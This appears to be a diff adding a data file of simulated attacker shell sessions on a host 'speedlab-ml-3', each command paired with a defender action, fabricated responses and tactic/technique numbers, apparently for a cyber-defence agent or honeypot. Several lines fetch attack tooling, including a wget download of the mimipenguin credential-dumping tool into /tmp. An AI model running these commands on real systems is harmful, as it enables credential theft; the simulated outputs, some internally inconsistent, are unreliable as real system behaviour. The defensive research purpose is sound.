@@ -1,0 +1,143 @@
+action:{ if output contain hardware setting, Change hardware setting }
+command:whoami
+response:chris
+tactic:1
+technique:165
+
+
+action:{ Block this command this time }
+command:if grep -iq "debian\|ubuntu\|kali\|mint" /usr/lib/os-release; then apt update && apt install -y binutils curl sqlite3; fi
+response:Command not found: 'if'
+action:{ if output is upload or download, Block this command by the network traffic }
+command:whoami
+response:chris
+action:{ if output is upload or download, Block this command by the network traffic }
+command:whoami
+response:chris
+tactic:1
+technique:165
+
+
+action:{ if output contain network speed, Degrade the network speed }
+command:if grep -iq "debian\|ubuntu\|kali\|mint" /usr/lib/os-release; then apt update && apt install -y binutils curl sqlite3; fi
+response:Get:1 http://archive.ubuntu.com/ubuntu focal InRelease [265 kB]
+Get:2 http://archive.ubuntu.com/ubuntu focal-updates InRelease [114 kB]
+Get:3 http://archive.ubuntu.com/ubuntu focal-backports InRelease [98.3 kB]
+Get:4 http://archive.ubuntu.com/ubuntu focal/main amd64 Packages [1,196 kB]
+Get:5 http://archive.ubuntu.com/ubuntu focal/universe amd64 Packages [11.3 MB]
+Get:6 http://archive.ubuntu.com/ubuntu focal-updates/main amd64 Packages [1,384 kB]
+Get:7 http://archive.ubuntu.com/ubuntu focal-updates/universe amd64 Packages [1,452 kB]
+Fetched 15.0 MB in 45s (327 kB/s)
+Reading package lists... Done
+Building dependency tree       
+Reading state information... Done
+The following additional packages will be installed:
+  binutils-bin libc-bin libc6 libc6-dev libc6-dev-bin libc6-i386 locales
+Suggested packages:
+  glibc-doc
+The following NEW packages will be installed:
+  binutils curl libc-bin libc6 libc6-dev libc6-dev-bin libc6-i386 locales sqlite3
+0 upgraded, 7 newly installed, 0 to remove and 0 not upgraded.
+Need to get 5,286 kB of archives.
+After this operation, 20.5 MB of additional disk space will be used.
+Get:8 http://archive.ubuntu.com/ubuntu focal/main amd64/binutils-bin amd64 2.34-6ubuntu1 [1,049 kB]
+Get:9 http://archive.ubuntu.com/ubuntu focal/main amd64/libc6 amd64 2.31-0ubuntu9 [2,689 kB]
+Get:10 http://archive.ubuntu.com/ubuntu focal/main amd64/libc-bin amd64 2.31-0ubuntu9 [198 kB]
+Get:11 http://archive.ubuntu.com/ubuntu focal/main amd64/libc6-dev amd64 2.31-0ubuntu9 [1,243 kB]
+Get:12 http://archive.ubuntu.com/ubuntu focal/main amd64/libc6-dev-bin amd64 2.31-0ubuntu9 [99.8 kB]
+Get:13 http://archive.ubuntu.com/ubuntu focal/main amd64/libc6-i386 amd64 2.31-0ubuntu9 [359 kB]
+Get:14 http://archive.ubuntu.com/ubuntu focal/main amd64/locales amd64 2.31-0ubuntu9 [2,042 kB]
+Get:15 http://archive.ubuntu.com/ubuntu focal/main amd64/curl amd64 7.68.0-1ubuntu2.6 [195 kB]
+Get:16 http://archive.ubuntu.com/ubuntu focal/main amd64/sqlite3 amd64 3.31.1-4ubuntu0.3 [1,267 kB]
+Fetched 5,286 kB in 1min 15s (74.3 kB/s)
+Selecting previously unselected package binutils-bin.
+(Reading database ... 300169 files and directories currently installed.)
+Preparing to unpack .../00-binutils-bin_2.34-6ubuntu1_amd64.deb ...
+Unpacking binutils-bin (2.34-6ubuntu1) ...
+Selecting previously unselected package libc-bin:amd64.
+Preparing to unpack .../01-libc-bin_2.31-0ubuntu9_amd64.deb ...
+Unpacking libc-bin (2.31-0ubuntu9) ...
+Selecting previously unselected package libc6:amd64.
+Preparing to unpack .../02-libc6_2.31-0ubuntu9_amd64.deb ...
+Unpacking libc6:amd64 (2.31-0ubuntu9) ...
+Selecting previously unselected package libc6-dev:amd64.
+Preparing to unpack .../03-libc6-dev_2.31-0ubuntu9_amd64.deb ...
+Unpacking libc6-dev (2.31-0ubuntu9) ...
+Selecting previously unselected package libc6-dev-bin:amd64.
+Preparing to unpack .../04-libc6-dev-bin_2.31-0ubuntu9_amd64.deb ...
+Unpacking libc6-dev-bin (2.31-0ubuntu9) ...
+Selecting previously unselected package libc6-i386:amd64.
+Preparing to unpack .../05-libc6-i386_2.31-0ubuntu9_amd64.deb ...
+Unpacking libc6-i386 (2.31-0ubuntu9) ...
+Selecting previously unselected package locales:amd64.
+Preparing to unpack .../06-locales_2.31-0ubuntu9_amd64.deb ...
+Unpacking locales (2.31-0ubuntu9) ...
+Selecting previously unselected package curl.
+Preparing to unpack .../07-curl_7.68.0-1ubuntu2.6_amd64.deb ...
+Unpacking curl (7.68.0-1ubuntu2.6) ...
+Selecting previously unselected package sqlite3.
+Preparing to unpack .../08-sqlite3_3.31.1-4ubuntu0.3_amd64.deb ...
+Unpacking sqlite3 (3.31.1-4ubuntu0.3) ...
+Setting up binutils-bin (2.34-6ubuntu1) ...
+Setting up libc-bin:amd64 (2.31-0ubuntu9) ...
+Setting up libc6:amd64 (2.31-0ubuntu9) ...
+Setting up libc6-dev:amd64 (2.31-0ubuntu9) ...
+Setting up libc6-dev-bin:amd64 (2.31-0ubuntu9) ...
+Setting up libc6-i386:amd64 (2.31-0ubuntu9) ...
+Setting up locales:amd64 (2.31-0ubuntu9) ...
+Setting up curl (7.68.0-1ubuntu2.6) ...
+Setting up sqlite3 (3.31.1-4ubuntu0.3) ...
+Processing triggers for libc-bin (2.31-0ubuntu9) ...
+Processing triggers for libc6 (2.31-0ubuntu9) ...
+chris@speedlab-ml-3:~$
+tactic:6
+technique:195
+
+
+action:
+command:if grep -iq "rhel\|fedora\|centos" /usr/lib/os-release; then yum update -y && yum install -y binutils curl sqlite-devel; fi
+response:chris@speedlab-ml-3:~$
+tactic:1
+technique:103
+
+
+action:{ Restore to original state }
+command:cd $HOME
+response:chris@speedlab-ml-3:~$
+tactic:1
+technique:46
+
+
+action:
+command:curl -O https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1005/src/art
+response:curl: (28) Operation timed out after 30001 milliseconds with 0 out of 0 bytes received
+chris@speedlab-ml-3:~$
+tactic:4
+technique:46
+
+
+action:{ Restore to original state }
+command:curl -O https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1005/src/gta.db
+response:curl: (28) Operation timed out after 30001 milliseconds with 0 out of 0 bytes received
+chris@speedlab-ml-3:~$
+action:{ Change terminal output this time }
+command:whoami
+response:chris
+tactic:5
+technique:131
+
+
+action:{ Block this command this time }
+command:wget -O "/tmp/mimipenguin.tar.gz" https://github.com/huntergregal/mimipenguin/releases/download/2.0-release/mimipenguin_2.0-release.tar.gz
+response:-bash: wget: command not found 
+chris@speedlab-ml-3:~$ 
+tactic:8
+technique:103
+
+
+action:{ if output content access right relative, change the access rights }
+command:mkdir /tmp/mimipenguin
+response:chris@speedlab-ml-3:~$ 
+action:{ if output contain network speed, Degrade the network speed }
+command:whoami
+response:chris
